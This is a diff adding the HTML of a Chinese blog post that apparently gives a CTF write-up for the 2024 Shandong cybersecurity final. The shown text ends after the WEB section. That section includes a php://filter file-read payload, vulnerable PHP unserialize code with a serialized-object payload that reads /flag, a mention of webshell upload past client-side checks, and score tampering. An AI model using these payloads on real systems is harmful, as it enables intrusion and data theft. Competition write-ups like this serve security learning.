@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.boychai.xyz","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/google-dark","dark":"base16/google-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言 打了这么久的CTF,头一次拿到这么好的成绩,也是运气比价好,赛题难度并不高,就是题型种类比较多    WEB Easyinclude 就是一个简单的伪协议，打开网页之后会有个提示，仅支持php:&#x2F;&#x2F;组装下面payload即可拿到flag file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag  easyserialization">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024山东省信创大赛-网络安全决赛-WriteUp">
+<meta property="og:url" content="https://blog.boychai.xyz/2024/11/16/2024%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%BF%A1%E5%88%9B%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B-WriteUp/index.html">
+<meta property="og:site_name" content="BoyChai&#39;s Blog">
+<meta property="og:description" content="前言 打了这么久的CTF,头一次拿到这么好的成绩,也是运气比价好,赛题难度并不高,就是题型种类比较多    WEB Easyinclude 就是一个简单的伪协议，打开网页之后会有个提示，仅支持php:&#x2F;&#x2F;组装下面payload即可拿到flag file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag  easyserialization">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116230638.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116230750.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116094649.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116220000.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116220425.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116221931.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116222107.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116222138.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116222602.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116222859.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116222959.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116223334.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116223518.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116223808.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116223932.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116224037.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116224314.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116232333.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116232407.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116232442.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116225938.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116230007.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116230103.png">
+<meta property="article:published_time" content="2024-11-16T23:17:00.000Z">
+<meta property="article:modified_time" content="2025-07-17T05:40:18.596Z">
+<meta property="article:author" content="BoyChai">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="CRYPTO">
+<meta property="article:tag" content="MISC">
+<meta property="article:tag" content="REVERSE">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.boychai.xyz/article/Pasted%20image%2020241116230638.png">
+
+
+<link rel="canonical" href="https://blog.boychai.xyz/2024/11/16/2024%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%BF%A1%E5%88%9B%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B-WriteUp/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.boychai.xyz/2024/11/16/2024%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%BF%A1%E5%88%9B%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B-WriteUp/","path":"2024/11/16/2024山东省信创大赛-网络安全决赛-WriteUp/","title":"2024山东省信创大赛-网络安全决赛-WriteUp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2024山东省信创大赛-网络安全决赛-WriteUp | BoyChai's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="dns-prefetch" href="waline-server-ten-phi.vercel.app">
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="BoyChai's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband">
+  <a target="_blank" rel="noopener" href="https://github.com/boychai" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  </div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">BoyChai's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-开往"><a href="https://www.travellings.cn/go.html" rel="section" target="_blank"><i class="fa fa-car fa-fw"></i>开往</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easyinclude"><span class="nav-number">2.1.</span> <span class="nav-text">Easyinclude</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyserialization"><span class="nav-number">2.2.</span> <span class="nav-text">easyserialization</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyUpload"><span class="nav-number">2.3.</span> <span class="nav-text">EasyUpload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyXSS"><span class="nav-number">2.4.</span> <span class="nav-text">EasyXSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B4%AA%E5%90%83%E8%9B%87"><span class="nav-number">2.5.</span> <span class="nav-text">贪吃蛇</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">3.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Snake"><span class="nav-number">3.1.</span> <span class="nav-text">Snake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xor-%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="nav-number">3.2.</span> <span class="nav-text">xor??-未解出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A61"><span class="nav-number">3.3.</span> <span class="nav-text">高等数学1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A62"><span class="nav-number">3.4.</span> <span class="nav-text">高等数学2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DHDH-%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="nav-number">3.5.</span> <span class="nav-text">DHDH-未解出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyrsa"><span class="nav-number">3.6.</span> <span class="nav-text">easyrsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#power-%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="nav-number">3.7.</span> <span class="nav-text">power-未解出</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">4.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-number">4.1.</span> <span class="nav-text">隐藏的信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E6%83%B3%E4%B8%8A%E6%97%A9%E5%85%AB"><span class="nav-number">4.2.</span> <span class="nav-text">不想上早八</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-number">4.3.</span> <span class="nav-text">奇怪的压缩包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AAMISC"><span class="nav-number">4.4.</span> <span class="nav-text">最后一个MISC</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-number">5.</span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-Android"><span class="nav-number">5.1.</span> <span class="nav-text">ez_Android</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">5.2.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">6.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#code-%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="nav-number">6.1.</span> <span class="nav-text">code-未解出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#int-%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="nav-number">6.2.</span> <span class="nav-text">int-未解出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#math"><span class="nav-number">6.3.</span> <span class="nav-text">math</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#text"><span class="nav-number">6.4.</span> <span class="nav-text">text</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BoyChai"
+      src="https://avatars.githubusercontent.com/u/88495409?s=96&v=4">
+  <p class="site-author-name" itemprop="name">BoyChai</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">75</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BoyChai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BoyChai" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@boychai.xyz" title="E-Mail → mailto:admin@boychai.xyz" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/277637284" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;277637284" rel="noopener me" target="_blank"><i class="fab fa-bilibili fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.boychai.xyz/2024/11/16/2024%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%BF%A1%E5%88%9B%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/88495409?s=96&v=4">
+      <meta itemprop="name" content="BoyChai">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoyChai's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2024山东省信创大赛-网络安全决赛-WriteUp | BoyChai's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2024山东省信创大赛-网络安全决赛-WriteUp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-16 23:17:00" itemprop="dateCreated datePublished" datetime="2024-11-16T23:17:00+00:00">2024-11-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">CTF相关</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF%E7%9B%B8%E5%85%B3/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2024/11/16/2024%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%BF%A1%E5%88%9B%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B-WriteUp/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2024/11/16/2024%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%BF%A1%E5%88%9B%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B-WriteUp/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打了这么久的CTF,头一次拿到这么好的成绩,也是运气比价好,赛题难度并不高,就是题型种类比较多<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116230638.png" alt="排名1"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116230750.png" alt="排名2"></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Easyinclude"><a href="#Easyinclude" class="headerlink" title="Easyinclude"></a>Easyinclude</h2><p>就是一个简单的伪协议，打开网页之后会有个提示，仅支持<code>php://</code>组装下面payload即可拿到flag<br><code>file=php://filter/read=convert.base64-encode/resource=/flag</code></p>
+<h2 id="easyserialization"><a href="#easyserialization" class="headerlink" title="easyserialization"></a>easyserialization</h2><p>源码没有保存，本地的只有留下了这样的一个源码,应该是还有一个创建时初始化的一个魔法函数我这里没有，也并不是很重要</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Reading file: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$this</span>-&gt;file) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$object</span> <span class="keyword">instanceof</span> Challenge) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object loaded successfully!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid object.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个就是一个简单的反序列化题目直接通过下面php代码可以拿到payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Reading file: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$this</span>-&gt;file) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span>  <span class="title function_ invoke__">Challenge</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
+<p>输出的payload就是<br><code>Tzo5OiJDaGFsbGVuZ2UiOjE6e3M6NDoiZmlsZSI7czo1OiIvZmxhZyI7fQ==</code><br>直接把这个通过get方法提交一下即可拿到flag。</p>
+<h2 id="EasyUpload"><a href="#EasyUpload" class="headerlink" title="EasyUpload"></a>EasyUpload</h2><p>就是一个简单的文件上传,他只是在前端做了校验,直接关闭js或者通过bp改包就可以直接上传一句话木马。</p>
+<h2 id="EasyXSS"><a href="#EasyXSS" class="headerlink" title="EasyXSS"></a>EasyXSS</h2><p>这个似乎只要触发一个js即可拿到flag,我这里提交的内容是<code>alert(&quot;a&quot;)</code>就直接出flag了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116094649.png" alt="flag"></p>
+<h2 id="贪吃蛇"><a href="#贪吃蛇" class="headerlink" title="贪吃蛇"></a>贪吃蛇</h2><p>这道题是一个贪吃蛇的小游戏，打开如果失败的话会疯狂弹alert,但是在js代码中有一段,我没截图,主要内容是当分数达到10000分数的时候会去访问<code>/check_score.php?score=&#123;score&#125;</code>,这个score是js获取的一个前端的分数,这里直接去访问,并且提交的分数改成10000即可拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116220000.png" alt="flag"></p>
